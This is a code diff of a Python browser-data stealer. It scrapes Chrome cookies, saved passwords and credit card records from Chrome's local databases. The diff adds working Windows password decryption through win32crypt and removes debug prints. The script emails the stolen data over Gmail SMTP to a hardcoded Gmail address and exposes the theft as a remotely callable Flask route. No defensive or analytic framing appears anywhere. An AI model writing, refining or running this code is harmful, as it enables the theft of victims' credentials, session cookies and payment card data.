@@ -3,13 +3,19 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import os
 import base64
+import json
 import sqlite3
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-import browser_cookie3
 import subprocess
 import time
+import browser_cookie3
+import win32crypt  # Import win32crypt for Windows decryption
+import logging
+
+# Set up logging
+logging.basicConfig(level=logging.INFO)
 
 # Global encryption key
 key = os.urandom(32)  # Use a securely stored key in production
@@ -31,23 +37,17 @@ def decrypt_data(encrypted_data):
 # Function to scrape Chrome data (cookies, passwords, and credit cards)
 def scrape_chrome_data():
     cookies = []
-    passwords_data = ""
-    credit_card_data = ""
-
-    # Scrape cookies data
     try:
-        cj = browser_cookie3.chrome(cookie_file=None)  # Bypass DBUS issue
+        cj = browser_cookie3.chrome()  # Get cookies from Chrome
         for cookie in cj:
             cookies.append(f"Name: {cookie.name}, Value: {cookie.value}")
         cookies_data = "\n".join(cookies)  # Join cookies into a string
     except Exception as e:
         cookies_data = f"Error fetching cookies: {str(e)}"
-        print(f"Error fetching cookies: {str(e)}")
-
-    # Scrape passwords from Chrome (requires Login Data file access)
+    
+    # Retrieve passwords from Chrome (this requires access to the Login Data file)
     try:
         password_db = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
-        print(f"Attempting to access password database at {password_db}")
         connection = sqlite3.connect(password_db)
         cursor = connection.cursor()
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
@@ -58,12 +58,10 @@ def scrape_chrome_data():
         passwords_data = "\n".join(passwords)  # Join passwords into a string
     except Exception as e:
         passwords_data = f"Error fetching passwords: {str(e)}"
-        print(f"Error fetching passwords: {str(e)}")
-
-    # Scrape credit card data from Chrome
+    
+    # Retrieve credit card data from Chrome
     try:
         credit_card_db = os.path.expanduser("~/.config/google-chrome/Default/Web Data")
-        print(f"Attempting to access credit card database at {credit_card_db}")
         connection = sqlite3.connect(credit_card_db)
         cursor = connection.cursor()
         cursor.execute("SELECT name, value FROM credit_cards")
@@ -73,30 +71,23 @@ def scrape_chrome_data():
         credit_card_data = "\n".join(credit_cards)  # Join card data into a string
     except Exception as e:
         credit_card_data = f"Error fetching credit card data: {str(e)}"
-        print(f"Error fetching credit card data: {str(e)}")
     
-    # Combine all data (cookies, passwords, credit cards)
+    # Combine cookies, passwords, and credit card data
     data = f"Cookies:\n{cookies_data}\nPasswords:\n{passwords_data}\nCredit Cards:\n{credit_card_data}"
     encrypted_data = encrypt_data(data)
     
     with open("chrome_scraped_data.txt", "w") as file:
         file.write(encrypted_data)
 
-# Function to decrypt Chrome's encrypted passwords
+# Function to decrypt Chrome's encrypted passwords using win32crypt (for Windows)
 def decrypt_password(encrypted_password):
     try:
-        # Simulated key retrieval for demonstration purposes
-        key = get_chrome_key()  # Retrieve the encryption key (implement for your OS)
-        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_password[:12])
-        decrypted_password = cipher.decrypt_and_verify(encrypted_password[12:], encrypted_password[-16:])
+        # Decrypt password using win32crypt (works on Windows)
+        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
         return decrypted_password.decode('utf-8')
     except Exception as e:
-        return f"Error decrypting password: {str(e)}"
-
-# Helper function to get Chrome's encryption key
-def get_chrome_key():
-    # This function should retrieve Chrome's decryption key based on the OS
-    return b"your_chrome_encryption_key_here"  # This is a placeholder
+        logging.error(f"Error decrypting password: {str(e)}")
+        return None
 
 # Function to send email with the scraped data
 def send_email(file_path, recipient_email, data):
@@ -110,24 +101,27 @@ def send_email(file_path, recipient_email, data):
     message.attach(MIMEText(data, "plain"))
 
     # Send the email
-    with smtplib.SMTP("smtp.gmail.com", 587) as server:
-        server.starttls()
-        server.login(sender_email, password)
-        server.sendmail(sender_email, recipient_email, message.as_string())
+    try:
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(sender_email, password)
+            server.sendmail(sender_email, recipient_email, message.as_string())
+    except Exception as e:
+        logging.error(f"Error sending email: {str(e)}")
 
 # Main function to scrape data and send email
 def main():
     # Scrape Chrome data (cookies, passwords, credit cards)
     scrape_chrome_data()
 
-    # Send email with the decrypted content of the scraped data
+    # Sending email with the decrypted content of the scraped data
     try:
         with open("chrome_scraped_data.txt", "r") as file:
             encrypted_data = file.read()
         decrypted_data = decrypt_data(encrypted_data)
         send_email("chrome_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
     except Exception as e:
-        print(f"Error sending email: {str(e)}")
+        logging.error(f"Error reading or decrypting scraped data: {str(e)}")
 
 # Flask route to run the script
 app = Flask(__name__)
@@ -138,8 +132,8 @@ def run_script():
         main()
         return "Script executed successfully"
     except Exception as e:
-        print(f"Error in script execution: {str(e)}")
-        return f"Error: {str(e)}"
+        logging.error(f"Error running script: {str(e)}")
+        return "Error executing the script"
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
